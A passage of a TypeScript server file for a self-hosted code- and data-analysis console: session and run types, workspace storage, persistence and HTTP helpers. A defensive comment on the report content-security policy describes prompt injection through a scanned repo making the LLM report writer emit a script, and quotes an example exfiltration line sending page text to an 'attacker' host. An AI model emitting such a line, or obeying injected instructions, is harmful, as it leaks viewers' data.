// Waggle console SERVER — the single-user, self-hosted control plane that turns the analysis pipeline into a
// connect → run → report app on localhost.
//
//   USER      one local user, no login (bind to localhost; see README → Security before exposing it)
//   PERSIST   connections (without raw credentials) and run history survive restarts (src/store.ts)
//   CONNECT   read-only GitHub token / public GitHub URL / local folder / BigQuery / Redis / MCP data planes
//   RUN       Quick Ask (one question) or Full Scan (Leadership + Execution reports), with incremental re-scan
//   BILLING   the user's own API keys (Anthropic required, OpenAI optional) — src/apiKeys.ts
//
// Node built-ins + git + the existing pipeline only — no web framework.

import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import { randomBytes, createHash } from 'node:crypto';
import { mkdtempSync, rmSync, readFileSync, writeFileSync, mkdirSync, existsSync, statSync, realpathSync, readdirSync, lstatSync, cpSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, basename, dirname, resolve as resolvePath } from 'node:path';
import { renderApp } from './serverUi.ts';
import { requestGuard, isLocalSecretPath } from './requestGuard.ts';
import { renderFindingsHtml } from './reportHtml.ts';
import { research } from './research/orchestrate.ts';
import type { DerivedDimension, CoverageNote } from './research/deriveDimensions.ts';
import { INVARIANTS, RANKING_INVARIANTS, ALL_INVARIANTS, baselineFloorInvariants } from './research/invariants.ts';
import { deepAudit, type Mitigation, type EvalToRun } from './research/deep.ts';
import { redactSecrets } from './research/reportEvidence.ts';
import type { Capability } from './research/capabilities.ts';
import { EXPERT_BUNDLES, type ExpertBundle } from './research/experts.ts';
import { BudgetLedger, withRunBudget, currentLedger, budgetOverrunReason, roundUsd } from './research/budget.ts';
import { withRunAbort } from './research/runAbort.ts';
import type { Hypothesis } from './research/investigation.ts';
import { investigateQuestion, gateScopedEvidence } from './research/scopedInvestigate.ts';
import { renderScopedReport } from './scopedTemplateHtml.ts';
import { buildScopedReportModel } from './scopedTemplateModel.ts';
import { generateRunTitle } from './research/runTitle.ts';
import { CKPT_ORDER, ckptRank, writeCheckpoint, loadCheckpoint, checkpointCompat, healCheckpointIndex, checkpointHealLogLine, inputsFingerprint, gitHeadSha, type CkptId, type CkptMeta } from './checkpoints.ts';
import { stripExternalFontLinks, withPrintPatch } from './reportChrome.ts';
import { makeRedisSource } from './sources/redis.ts';
import { patternsFor } from './research/patterns.ts';
import { mergeLedger, orgSlug } from './memory.ts';
import { makeWarehouseSource } from './sources/warehouse.ts';
import { makeBigQuerySource } from './sources/bigquery.ts';
import { makeRepoGrepSource } from './sources/repogrep.ts';
import { codeintelEnabled, runCodeintelChoice } from './sources/codeintel.ts';
import { docRecoveryEnabled } from './research/docRecovery.ts';
import { makeOrgMemorySource } from './sources/orgmemory.ts';
import { LOCAL_TENANT, LOCAL_ORG_ID, orgIdForTenant } from './localOrg.ts';
import { initApiKeys, apiKeyStatus, setApiKeys, ApiKeyError, keyProvider } from './apiKeys.ts';
import { execMemoryBrief, memoryEnabled, memoryCardLines, orgMemorySummary, listOrgMemory, getOrgMemoryHistory, getOrgMemoryCard, saveOrgMemoryCard, deleteOrgMemoryCard, revertMemoryEvent, draftFreeformMemory, extractMemoryFromReport, type MemoryCard } from './orgMemory.ts';
// Tier-3 GLOBAL memory namespace org (GLOBAL_MEMORY_ORG_ID):
// cross-company universal methods live here; the backend recall merges them into EVERY org, and the Memory tab's
// Tier-3 view lists them directly. an admin can list it; others fail-open to an empty Tier-3.
const GLOBAL_MEMORY_ORG_ID = 'org_global';
import { withMemoryPush, memoryPushEnabled } from './memory/push.ts';
import { withMemoryRecall } from './memory/recall-tool.ts';
import { makeMcpSource, normalizeMcpName } from './sources/mcp.ts';
import { mergeAgentTools, type DataSource } from './sources/types.ts';
import { type Finding, type MinerResult, type CoverageGap, findingHasResolvableEvidence, findingResolvesInWorkspace } from './schema.ts';
import { remoteHeadSha } from './github.ts';
import { scanBaselineInfo, githubCompareFiles, githubFileAt, resolveBaselineFilters } from './run/scanBaseline.ts';
import { inputsSigOf, orgKeyFor, registryHashes, runTargets, targetKeyFor } from './scanLineage.ts';
import { canSeeFromSources, getOrgCompare, getOrgFacts, getOrgProjects, postOrgAliases, postOrgProjects, type WriteGate } from './orgMemoryApi.ts';
import { listProjects } from './orgProjects.ts';
import { localNamesFor } from './run/incrementalRun.ts';
import { whoami, listOrgRepos, listReposWithOrgs, cloneRepo, parseRepoRef, type GhRepo } from './github.ts';
import { dataDir, ensureStore, loadState, saveState, saveReport, loadReport, reportExists, reportArtifactPath, reportHtmlPath, deleteReport, deleteArtifact } from './store.ts';
import { peekReportWords } from './reportWords.ts';
import { listConversations, getConversation, createConversation, appendMessage, updateMessage, deleteConversation, chatSystemPrompt, chatUserPrompt, runChatTurn } from './chat.ts';
import { readAuditLeaves } from './research/auditLog.ts';
import { PLANE_EXPOSES, type PlaneInfo } from './research/planeManifest.ts';
import { engineeringReportUrl, isRuledOutFinding } from './reportAnchors.ts';
import { type LinkIndex, linkifyReport, loadLinkIndexFile } from './reportLinks.ts';
import { buildReportScope, injectReportScope, type CodeManifest, type ScopeEntry } from './reportScope.ts';
import { backfillFindingsIndex } from './reportIndex.ts';
import { renderAuditHtml } from './auditReportHtml.ts';
import { persistableSource, rehydratePersistedSource, connectionCredentials, redactUrlCredentials, GITURL_CAP } from './sources/persist.ts';
import { escapeHtml, envMcpSources, osvPublicOnly, measurePlaneIdentities, runBudget, effectiveRunBudget } from './run/shared.ts';
import { loadAppSettings, saveRunBudget, SettingsError, rememberCredentials, setRememberCredentials, loadCredentials, saveCredentials } from './appSettings.ts';
import { telemetryStatus, setTelemetryEnabled, markNoticeShown, telemetryNotice, TELEMETRY_FIELDS, examplePayload, track } from './telemetry.ts';
import { executeOrgRun, tokenForRun, uniqueChildDir } from './run/execute-org-run.ts';
import { parseAskPlaneSelection, parsePlaneSelection, parseSiblingRecall, scopeSourcesToSelection, selectionSummary } from './run/planeSelection.ts';
import { askLocalFolderList, parseAskLocalFolders, resolveAskLocalFolders } from './run/askLocalFolders.ts';
import { writeUploadedFiles } from './sources/uploadedFolder.ts';
import { ledgerMergeDecision } from './run/ledgerGate.ts';
import { noteDegraded, type RunDegradation } from './run/degraded.ts';
import { findingCounts, type RuledOutItem } from './run/findingCounts.ts';
import { probeOpenAiAuth } from './research/openaiAuthProbe.ts';
import { runLedgerHooks, type RunContext } from './run/run-context.ts';
import type { IncrementalReplay, IncrementalSummary, LaneReadFields } from './run/incrementalRun.ts';

// ── API keys ── All model usage bills the user's own keys: ANTHROPIC_API_KEY (or a local `claude` login) and an
// optional OPENAI_API_KEY, from the environment / .env or Settings → API keys (src/apiKeys.ts).
initApiKeys();
loadAppSettings();
const APP_VERSION: string = (() => { try { return String(JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8')).version || '0.0.0'); } catch { return '0.0.0'; } })();

const PORT = Number(process.env.PORT) || 4317;
// Bind to loopback by default: the console has no login. The Docker image sets HOST=0.0.0.0 inside the container.
const HOST = process.env.HOST || '127.0.0.1';
const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;
const RUN_MODE: 'deterministic' | 'agentic' = process.env.THERESA_RUN_MODE === 'deterministic' ? 'deterministic' : 'agentic';
// LOCAL-FOLDER scans read folders on THIS machine. On by default in the single-user app; THERESA_LOCAL_AUDIT=0 turns
// it off (e.g. when the server is exposed beyond localhost).
const LOCAL_AUDIT = process.env.THERESA_LOCAL_AUDIT !== '0';
const NO_CLAUDE_KEY = 'Add your Anthropic API key first — open Settings → API keys (or set ANTHROPIC_API_KEY in .env), then try again.';


// ── state (tenant-scoped, persisted) ────────────────────────────────────────────
// ghToken + authToken are in-memory only, never persisted. authToken = a BYO Claude
// credential the logged-in user pastes (subscription OAuth token sk-ant-oat… from
// `claude setup-token`, or a metered API key sk-ant-api…); their runs run on it.
interface Session { who: string; tenant: string; authToken?: string; }
// The one local user. The app is single-user and self-hosted: there is no login, and every request acts as this session.
const LOCAL_SESSION: Session = { who: 'local', tenant: LOCAL_TENANT };
function actingOrgId(_session: Session): string { return LOCAL_ORG_ID; }
function runInActingOrg(session: Session, id: string): Run | undefined { return store.getRun(session.tenant, id); }

// Max public-URL (giturl) scan targets per org — enforced BOTH at Connect (paste) and on profile Load, so a
// seeded/imported profile can't fan out clones beyond this. Dedup is by fullName on both paths.
// A connected, read-only source. Raw credentials (token / mcpToken / saJson) live in memory and are stripped by
// persistableSource before anything is written to disk.
export interface Source {
  id: string; kind: 'github' | 'warehouse' | 'keyvalue' | 'local' | 'analytics' | 'bi' | 'custom' | 'giturl'; name: string; status: 'ready' | 'error'; detail: string;
  token?: string; repos?: GhRepo[];                                     // github: a read-only personal access token + the repos it can read
  saJson?: string;                                                      // warehouse: a BigQuery service-account key (read-only role)
  mcpUrl?: string; mcpToken?: string;                                   // warehouse / keyvalue / generic MCP (analytics/bi/custom)
  mcpName?: string; exposes?: string; allowedTools?: string[];          // generic MCP: server name the agent sees · one-line "what it exposes" (plane hints) · EXACT read-only tool allowlist (host-side guard)
  credStripped?: boolean;                                               // PERSIST-only marker: set by persistableSource when it drops a raw credential; never on a live source
  localRepos?: { path: string; name: string; uploadedAt?: string; count?: number }[]; // local: folders on this machine (or uploaded from the browser); uploadedAt/count mark an upload
  giturlRepos?: { fullName: string; cloneUrl: string }[]; // giturl: PUBLIC github.com repos pasted by URL (parseRepoRef-validated, github.com-only SSRF guard); cloned tokenless
}
export interface Run {
  id: string; tenant: string; mode: 'deterministic' | 'agentic'; targetName: string; repoFilter: string[] | null; projectFilter: string[] | null;
  createdAt?: string; createdBy?: string;  // run start time (ISO) + the user who kicked it off (session email) — shown in Run history
  alias?: string;      // optional human label shown INSTEAD of the rs_… id in Run history/detail; the id stays the unique key everywhere (links, share, filenames). Persisted.
  renamed?: string;    // a user-edited run TITLE; overrides the auto/generated title (runTitle) in the run list + report. Independent of `alias` (which relabels the id). Persisted; blocks the auto-generated title from clobbering it.
  useMemory?: boolean; // per-run "Use org memory" toggle (UI, DEFAULT ON) — false disables the org-memory push for this run. Undefined ⇒ on.
  writeMemory?: boolean; // per-run "Write learnings to memory" tick (UI, DEFAULT OFF) — true mounts the write-capable memory MCP for this run (gated additionally by the ACCEL_MEMORY_WRITE_ENABLED env master). Undefined/false ⇒ no write plane.
  codeintel?: boolean; // per-run "Code intelligence" toggle (UI, DEFAULT ON when THERESA_CODEINTEL available) — false skips the repowise index/plane/digest+viz for this run. Undefined ⇒ on (when available). The env flag is the availability gate; this is per-run opt-out.
  codeintelInReports?: boolean; // Set by executeOrgRun once the reports are final — true iff any delivered report (area/leadership/combined) carries the codeintel viz (anyReportHasCodeintelViz). Drives the run-detail card's 'unavailable' branch. Undefined on legacy runs. Non-secret, persisted.
  docRecovery?: boolean; // per-run "Design & evolution report" tick (UI, DEFAULT OFF) — true produces the standalone provenance report for this run (gated additionally by THERESA_DOC_RECOVERY availability). Undefined/false ⇒ no provenance report (it is an LLM-cost stage, so opt-in).
  logTimes?: number[]; // epoch-ms per log line (lockstep with log[]); sent as the SSE id so the event stream renders a wall-clock HH:MM:SS. Persisted; pre-existing runs have none.
  status: 'queued' | 'running' | 'complete' | 'error' | 'stopped'; log: string[]; reportHtml: string | null; findings: number; costUsd: number | null; error?: string;
  // 'queued' = admitted but PARKED by the heavy-run promoter (a slot wasn't free) — not yet executing, no live
  // output. It flips to 'running' when pump() promotes it. A queued run has NO worker, so a restart reaps it to
  // 'error' (see restore).
  // stopRequested / abort moved OFF Run to the liveRuns side-table — access via liveRun(run).stopRequested / .abort
  leadershipHtml?: string | null; // the second report (deep-brief leadership brief); stored via saveReport(id+'-leadership'), stripped from state JSON like reportHtml
  bundleReports?: { id: string; title: string }[]; // per-bundle AREA reports (one per activated bundle that found something); HTML on disk via saveReport(id+'-bundle-'+bundleId), this {id,title} metadata is non-secret and persisted
  combinedHtml?: string | null; // the Report Normalizer's merged single-file tabbed deliverable (leadership + every area report, one unified style); saveReport(id+'-combined'), stripped from state JSON like reportHtml
  hasCombined?: boolean; // a merged/combined report exists on disk (saveReport(id+'-combined')); served at /api/runs/:id/combined. Non-secret flag, persisted in state JSON.
  hasTrace?: boolean; // a merged agent-trajectory + tool-tally artifact exists on disk (saveReport(id+'-trace')); served at /api/runs/:id/trace (tenant-scoped), NEVER on /share. Non-secret flag, persisted in state JSON.
  hasAudit?: boolean; // a per-node AUDIT-LOG flight-recorder HTML exists (saveReport(id+'-audit'), from the audit.jsonl the leaf wrappers spool); served at /api/runs/:id/audit, NEVER on /share. Non-secret flag.
  hasWorkItems?: boolean; // a DEDICATED eng-facing work-item report exists (saveReport(id+'-workitems')) — ask runs whose question asked for fixes; served at /api/runs/:id/workitems, surfaced as the "Work items" report tab. Non-secret flag.
  hasProvenance?: boolean; // a STANDALONE provenance / doc-recovery report exists (saveReport(id+'-provenance')) — design & evolution recovered from git history (gated THERESA_DOC_RECOVERY); served at /api/runs/:id/provenance. Non-secret flag, persisted.
  // subs (live SSE handles) / authToken (BYO Claude credential) moved OFF Run to the liveRuns side-table — access via liveRun(run).subs / .authToken
  orgId?: string; // the acting org resolved AT run creation (actingOrgId(session)) — the multi-org seam's captured value. Run-derived org lookups read `run.orgId ?? orgIdForTenant(run.tenant)`; undefined (pre-seam runs) falls back to the tenant map = no behavior change.
  // SELF-CONTAINED SOURCE SNAPSHOT (cross-org leak fix). A heavy run captures its acting org's source set AT CREATE
  // and executes against THAT — never the LIVE org workspace (runWs) — so a concurrent acting-org switch / claim /
  // connect / auto-apply can't swap another org's warehouse/MCP/gcp planes under an in-flight run.
  pinnedSources?: Partial<Source>[]; // NON-SECRET snapshot (persistableSource form: repos + Secret-Manager refs {tokenRef, installationId, saKeyRef, mcpTokenRef}, box/giturl/local config; raw in-memory tokens stripped). PERSISTED (safe), so a queued run promoted later still has its binding; rehydrated per-run at execute.
  // boundSources (the RESOLVED in-memory execution snapshot carrying any raw pasted tokens/mcpToken not covered by a ref;
  // set at create from the live set, executeOrgRun reads THIS) moved OFF Run to the liveRuns side-table — access via liveRun(run).boundSources / runSourceSet(run)
  brief?: string; // user-stated run brief (optional, from the console) — steers the agentic run; persisted with run history
  derivedDimensions?: DerivedDimension[]; // dimensions minted from the brief this run (archived for reproducibility; non-secret)
  coverage?: CoverageNote[];              // how each stated concern mapped (covered by a built-in vs minted)
  localFilter?: string[] | null; // selected local folder paths (local-machine audit), when a 'local' source is used
  giturlFilter?: string[] | null; // selected public-github-URL repos (fullNames), when a 'giturl' source is used
  // EXPLICIT per-run data-plane / exec-box selection (src/run/planeSelection.ts). Data-plane Source ids /
  // BoxLink ids the run may mount; [] = none. undefined/null = a LEGACY run record created before the gate (mounts
  // every connected plane, as it did then). The pinned source snapshot is scoped to these at create AND at execute.
  planeFilter?: string[] | null;
  // Structured DEGRADATION record (fix-goal decision 3): one {stage, reason, at} per stage that degraded instead of
  // failing (fail-open, but not silent) — the run page renders it as a warning banner. Written ONLY via
  // noteDegraded (src/run/degraded.ts). Non-secret; persisted.
  degraded?: RunDegradation[];
  // Ruled-out (refuted — checked and healthy) rows the run shipped alongside its findings. NOT counted in
  // `findings` (the confirmed count); set by finishRun from the same findingCounts split every surface reads. A LIST
  // ({id, title} per refuted hypothesis) so the run page can name them; a record persisted before the list stored a
  // bare count (the run page reads both).
  ruledOut?: RuledOutItem[] | number;
  invariantKeys?: string[] | null; // invariants selected in the UI (i1..i13); null ⇒ auto (all general + ranking-if-detected)
  bundles?: string[] | null; // expert bundles MANUALLY selected in the UI (subset of EXPERT_BUNDLES ids); non-empty ⇒ run EXACTLY these + skip Comprehend + bypass the domain cap. null/empty ⇒ auto (Comprehend selects).
  kind?: 'org' | 'audit' | 'ask' | 'design'; // 'audit' = ranking/data-trust deep-audit; 'ask' = accel-mini scoped-question → free-vibe report (no pipeline); 'design' = LEGACY read-only (the removed Design Doc tab — old persisted runs keep their saved report; nothing creates one any more); default 'org'
  auditIssue?: string;    // audit: the pasted intake (presenting symptoms) — the deepAudit `issue`
  auditScope?: string;    // audit: a human scope label (e.g. "MMoE ranker")
  askQuestion?: string;   // ask: the raw freestyled scoped question — the accel-mini `question`
  askScope?: string;      // ask: optional human scope label / hint
  scopeLabel?: string;    // org run: the user's New Full Scan "Scope label" (optional, ≤120 chars) — shown as the run title's subtitle; non-secret
  askFixes?: boolean;     // ask: force an engineering work-item section even if the question didn't ask for a fix
  askRepos?: { fullName: string; branch?: string }[];   // ask: the repos to scan (from the Ask-tab selector) — EXPLICIT: empty ⇒ no code mounted (a data-only ask; a queue-linked default-profile request is seeded with the profile repos). Cloned via the github source's PAT (tokenless for public repos).
  askLocal?: string[];    // ask: the connected local folders to mount (opaque ids from GET /api/ask/repos `local`, src/run/askLocalFolders.ts) — EXPLICIT: empty ⇒ none. Resolved to paths at staging time; never a client path.
  // Quick Ask / Rec audit: what was ACTUALLY staged — each cloned repo @ its HEAD SHA (+ public = a connected giturl
  // repo) and the copied local folders by NAME (never a path). Recorded at clone time (resolveAskRoot /
  // executeAuditRunInner) so the served report can state "Scope: owner/repo @ abc1234" (src/reportScope.ts). Non-secret.
  codeManifest?: CodeManifest;
  auditRepos?: { fullName: string; branch?: string }[]; // audit: the repos to scan (from the Recsys Audit selector). Default = the acting org's profile repos. Overrides the box profile's auditRepos for this run's live-exec clone.
  trashed?: boolean;      // report soft-deleted from the Report tab → shown under Trash; persisted. "Empty trash" purges artifacts + drops the run.
  trashedAt?: string;     // when it was trashed (ISO)
  askAnswer?: string;     // ask: the dossier's grounded answer (full) — kept for the minimal Runs detail; the report is the full read
  // Memory layer: the reusable diagnostic method(s) this run reinforced (VALUE-FREE — pattern titles + signal
  // keywords only, never a company name/number) + the per-org findings-ledger merge counts. Computed in finishRun
  // from patternsFor() + mergeLedger(); surfaced on the run page (terminal card) and the report folder (method
  // receipt). Non-secret; persisted with run history via the ...rest spread.
  learned?: {
    pattern: string;            // headline reusable method (top matched seed pattern)
    signature: string[];        // symptom-signature keywords that matched THIS run
    checks: string[];           // methods the next run auto-runs (matched pattern titles)
    saved: { added: number; updated: number; total: number };  // mergeLedger() result: new / reinforced / total
  } | null;
  // QuickAsk memory layer: the reusable diagnostic method(s) this READ-ONLY ask RECOGNIZED (matched) — value-free
  // pattern title + matched signal keywords + what a full scan would auto-check. Unlike `learned`, an ask writes
  // NOTHING to the ledger (findings=0), so there are NO save counts. Computed in executeAskRun from
  // patternsFor(question, scope, answer); surfaced on the ask run page (terminal) + report folder (recognition card).
  recognized?: {
    pattern: string;            // headline recognized method (top matched seed pattern)
    signature: string[];        // symptom-signature keywords that matched THIS ask
    checks: string[];           // what a full scan would auto-check (matched pattern titles)
  } | null;
  // Checkpoint / resume. Metadata rows are non-secret and persisted;
  // payloads live on disk as `<id>-ckpt-<stage>.json` sidecars in the report store. resumeSpec is the loaded
  // replay context of a CHILD run — in-memory only, stripped from persist like subs/abort.
  checkpoints?: CkptMeta[];      // durable self-consistent cuts captured this run (agentic org runs only)
  resumedFrom?: { runId: string; checkpoint: CkptId };  // child-run lineage; persisted, never on /share
  supersededBy?: string;         // a fault-recovery resume created this child from a non-complete parent
  reusedCostUsd?: number;        // parent spend represented by the replayed checkpoints (display-only)
  // Incremental re-scan (src/run/incrementalRun.ts). fullRescan = the New Full Scan
  // "Full rescan" tick (POST body `fullRescan: true`) — skip reuse, still diff against the baseline. baselineRunId +
  // incremental = what the executor planned against the baseline (mode, reason, lanes reused / re-run and why, repo
  // change classes, the since-last-scan counts). All non-secret, persisted, never on /share.
  fullRescan?: boolean;
  // Cross-project org memory: the New Full Scan "Compare with other
  // projects in this org" tick (POST `siblingRecall: true`, default off, validated by parseSiblingRecall; a resume
  // inherits the parent's). On ⇒ after Comprehend the Critic + Expert nodes get a CONTRAST block of sibling-project facts.
  siblingRecall?: boolean;
  baselineRunId?: string;
  incremental?: IncrementalSummary;
  // Report lens split Phase 2 (research/capabilities.ts): the product's CAPABILITY MAP Comprehend produced (≤ 12 features /
  // journeys with code anchors; validated). Absent = no map (library repo, manual / keyword run, an older run). Non-secret.
  capabilities?: Capability[];
  // resumeSpec (in-memory replay context: loaded payloads + per-bundle reuse set) moved OFF Run to the liveRuns side-table — access via liveRun(run).resumeSpec
}
// Replay context a resumed (child) run carries through executeOrgRun/orgCritiqueExpert.
// `data` holds the parent's checkpoint payloads UP TO `ckpt`; `reuse` is the set of bundle
// ids whose completed lanes replay (an unticked completed bundle re-runs — partial
// invalidation, sound because lanes are independent until the barrier).
export interface ResumeSpec {
  parentId: string;
  parentLabel: string;           // display: parent alias/id for the "reused from" log lines
  ckpt: CkptId;                  // the EFFECTIVE cut (clamped to 'barrier' when any completed lane re-runs)
  reuse: Set<string>;
  data: Partial<Record<CkptId, any>>;
  // Set only for an AUTOMATIC incremental replay (src/run/incrementalRun.ts): the baseline plan + payloads the executor
  // needs beyond a plain resume (per-lane reasons, the baseline's claim-audit verdicts for reused lanes, changed paths).
  incremental?: IncrementalReplay;
}
// Serialized lane output inside frontier/barrier payloads — BundleOut minus the live
// ExpertBundle object (revived from the registry on load; registry membership is
// validated at resume time, fail-closed).
// Incremental re-scan (additive — no stage-version bump; absent on older sidecars): the lane's recorded read set
// (repo-normalized paths / globs / grep probes / opaque reads / measure planes called, src/research/readSet.ts), its
// spend the last time it actually RAN (spentUsd — carried when reused), when it ran / measured (ranAt / measuredAt) and
// the run it was carried from (reusedFrom).
export type LaneSnap = { bundleId: string; title: string; hypotheses: Hypothesis[]; mitigations: Mitigation[]; findings: Finding[]; gaps: CoverageGap[]; trace: string; toolTally: Record<string, number>; areaReportHtml?: string; evalsToRun?: EvalToRun[] } & LaneReadFields;
// Connected sources live in an OrgWorkspace PER (tenant, org), never per tenant alone: one shared source list would
// let a run for org A mount the connections hydrated for org B (e.g. B's data planes, PAT and eval boxes). In the
// single-user app there is one tenant and one workspace key. Request handlers read the acting org's workspace (sessionWs), run
// code reads the run's own org (runWs); an acting-org switch moves to another workspace instead of clearing a shared one.
interface OrgWorkspace { sources: Source[]; }
interface TenantState { orgs: Map<string, OrgWorkspace>; runs: Map<string, Run>; }
const sessions = new Map<string, Session>();
const tenants = new Map<string, TenantState>();

// ── Live-only run side-table (store seam) ───────────────────────────────────
// The SIX transient / process-handle run fields — subs (live SSE response handles), abort (AbortController),
// authToken (BYO Claude credential), boundSources (the pinned execution source snapshot), resumeSpec (in-memory
// replay payloads) and stopRequested — are NOT persisted (they were already stripped from persist()). They now
// live OFF the Run object entirely, in this in-memory side-table keyed by the STABLE run.id, so a future remote
// Store (whose getRun returns a deserialized Run lacking these) can compose with this map. Object identity is
// load-bearing (pumpHeavyRuns + the fire-and-forget executors hold the same run through create→promotion), and
// run.id never changes, so the entry survives for the run's whole life and is dropped only when the run is deleted.
interface LiveRun {
  subs: Set<ServerResponse>;
  abort?: AbortController;
  authToken?: string;
  boundSources?: Source[];
  resumeSpec?: ResumeSpec;
  stopRequested?: boolean;
  // Lease/heartbeat only: set true once a backend heartbeat has DEFINITIVELY confirmed our lease (ok && leased)
  // at least once on this instance. Until then, a transient pre-claim `ok && !leased` (the running+lease shadow PUT
  // hasn't settled yet, so the backend row isn't status='running') must NOT be treated as a lost lease — else we'd
  // abort a legitimately-executing new run. In-process only; the WeakMap entry dies with the run object.
  leaseConfirmed?: boolean;
}
const liveRuns = new WeakMap<Run, LiveRun>();
// Always returns a valid LiveRun, lazily creating `{ subs: new Set() }` on first access — so every read/write
// site gets an initialized object, mirroring today where liveRun(run).subs was always a live Set. Keyed by the
// run OBJECT (WeakMap): the entry's lifetime == the run object's lifetime, so it lives exactly as long as any code
// (executor / pump / SSE close handler) still holds the run and is GC'd with it — matching the earlier semantics
// where these fields lived on the run object itself. So: no manual delete, no resurrect-after-delete leak, and a run
// trashed+emptied mid-execution keeps its live state as long as the background task still holds the object.
// NOTE: a remote Store returns fresh deserialized run objects per read; when that lands, re-key the live
// handles by run.id and compose them explicitly — this WeakMap is correct only while run objects are stable in-process.
function liveRun(run: Run): LiveRun {
  let lr = liveRuns.get(run);
  if (!lr) { lr = { subs: new Set() }; liveRuns.set(run, lr); }
  return lr;
}

function tstate(tenant: string): TenantState {
  let t = tenants.get(tenant);
  if (!t) { t = { orgs: new Map(), runs: new Map() }; tenants.set(tenant, t); }
  return t;
}
// The org workspace key: the org id, or '' for a tenant with no org (an unmapped / local single-org deployment).
const wsKey = (orgId: string | null | undefined): string => (orgId ?? '').trim();
/** The connected-source workspace of one org inside a tenant (created empty on first use). */
function wsFor(tenant: string, orgId: string | null | undefined): OrgWorkspace {
  const t = tstate(tenant);
  const k = wsKey(orgId);
  let w = t.orgs.get(k);
  if (!w) { w = { sources: [] }; t.orgs.set(k, w); }
  return w;
}
/** The workspace of the session's ACTING org — what the console shows and what a new run may mount. */
function sessionWs(session: Session): OrgWorkspace { return wsFor(session.tenant, actingOrgId(session)); }
/** The workspace of the org a run belongs to (run.orgId, captured at creation; pre-seam runs → the tenant's org). */
function runWs(run: Run): OrgWorkspace { return wsFor(run.tenant, run.orgId ?? orgIdForTenant(run.tenant)); }

function persist(): void {
  saveState({
    tenants: [...tenants.entries()].map(([id, t]) => [id, {
      orgSources: [...t.orgs.entries()].map(([org, w]) => [org, w.sources.map(persistableSource)]),
      // The three disk-backed HTML caches are stripped (they live as report files); everything else on Run is non-secret.
      runs: [...t.runs.values()].map(persistableRun),
    }]),
  });
  // Raw connection credentials never go into state.json. With Settings → "Remember connection credentials" on they are
  // kept in their own 0600 file so connections survive a restart; off, saveCredentials removes that file.
  const creds: Record<string, Record<string, string>> = {};
  for (const t of tenants.values()) for (const w of t.orgs.values()) for (const s of w.sources) {
    const c = connectionCredentials(s);
    if (c) creds[s.id] = c as Record<string, string>;
  }
  saveCredentials(creds);
}
function persistableRun(r: Run) {
  const { reportHtml, leadershipHtml, combinedHtml, ...rest } = r;
  return rest;
}
// Boot restore. A run that was 'queued' or 'running' when the process stopped has no worker any more, so it is
// reaped to 'error' (resume it from its last checkpoint instead). Connected sources come back without their raw
// credentials (persistableSource strips them) and need a reconnect where they had one.
async function restore(): Promise<void> {
  const data = loadState();
  if (!data) return;
  let reaped = false;
  const savedCreds = loadCredentials();
  for (const [id, t] of data.tenants ?? []) {
    const ts = tstate(id);
    const orgSources = (t as { orgSources?: [string, unknown[]][] }).orgSources;
    if (Array.isArray(orgSources)) {
      for (const [org, list] of orgSources) wsFor(id, org).sources = (Array.isArray(list) ? list : []).map((s) => rehydratePersistedSource(s as never, savedCreds[(s as { id?: string })?.id ?? '']));
    }
    for (const r of t.runs ?? []) {
      const interrupted = r?.status === 'queued' || r?.status === 'running';
      if (interrupted) reaped = true;
      ts.runs.set(r.id, { ...r, reportHtml: null, leadershipHtml: null, combinedHtml: null,
        ...(interrupted ? { status: 'error' as const, error: r.error ?? 'interrupted by a server restart' } : {}) });
    }
  }
  if (reaped) persist();
}


// ── http helpers ──────────────────────────────────────────────────────────────────
function sendJson(res: ServerResponse, code: number, body: unknown): void {
  const s = JSON.stringify(body);
  res.writeHead(code, { 'content-type': 'application/json', 'content-length': Buffer.byteLength(s) });
  res.end(s);
}
function sendHtml(res: ServerResponse, code: number, html: string): void {
  res.writeHead(code, { 'content-type': 'text/html; charset=utf-8' });
  res.end(html);
}
// Reports are LLM-AUTHORED HTML served same-origin (console iframe + public /share) — a prompt-injected scanned
// repo could make a writer emit a <script> that reads tenant APIs with the viewer's cookies or exfiltrates the
// report. Serve EVERY report under a strict CSP: inline script/style stay (the report's own interactivity — lang
// toggle, section nav) but every egress channel is denied — `connect-src 'none'` (no fetch/XHR/WS/beacon) AND the
// `sandbox` directive (opaque origin, NO top-navigation / popups / forms / same-origin), which closes the
// navigational leak `location='https://attacker/?d='+document.body.innerText` on the TOP-LEVEL /share page where
// the iframe sandbox does not apply. `allow-scripts` keeps the report interactive; `allow-downloads` keeps its
// export. Reports are self-contained by contract (assets are data: URIs), so nothing here breaks rendering.
const REPORT_CSP = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; media-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; sandbox allow-scripts allow-downloads";
function sendReportHtml(res: ServerResponse, code: number, html: string): void {
  res.writeHead(code, { 'content-type': 'text/html; charset=utf-8', 'content-security-policy': REPORT_CSP, 'x-content-type-options': 'nosniff' });
  res.end(stripExternalFontLinks(html));   // A font-host <link> is blocked by this CSP anyway — drop it, no console error
}
// Serve-time CSS injected into stored reports, whose HTML is frozen at generation
// time. HERO_FIX retro-patches the hero-band flex-shrink clip (overflow:hidden made
// the hero a shrinkable flex item, so a short viewport clipped headline/synthesis/
// stats) on BOTH the console and public /share paths, so already-stored reports are
// fixed without a re-run — new reports carry the fix in reportHtml.ts itself.
const HERO_FIX = '.hero{flex:none!important}';
function injectBeforeHead(html: string, snippet: string): string {
  return html.includes('</head>') ? html.replace('</head>', `${snippet}</head>`) : snippet + html;
}
// The console iframes the report at /api/runs/:id/report next to its OWN topbar
// (which carries the single Export REMEDIATION.md action). Hide the report's own
// in-document topbar in that context so there is one header / one Export. No export
// retrofit here — the report's own button is hidden, so only the hero clip needs it.
// Every serve path also (a) turns cited `path:line` refs into GitHub permalinks from the run's link index
// (reportLinks.ts; absent index ⇒ no links) and (b) adds the one print/readability patch (reportChrome.withPrintPatch).
// Both are idempotent (markers), so a stored report that already carries them is served unchanged.
function runLinks(run: Run): LinkIndex | null {
  return loadLinkIndexFile(reportArtifactPath(run.id, 'links.json'));
}
// REPORT SCOPE (src/reportScope.ts): the repo(s) @ commit a run audited, from the best record it has — the workspace
// checkpoint manifest (Full Scan), run.codeManifest (Quick Ask / Rec audit, newer runs), the links sidecar, else the
// selection filters (names only). Serve-time, so reports stored before this existed get it too. null ⇒ unknowable.
function runScope(run: Run): ScopeEntry[] | null {
  try {
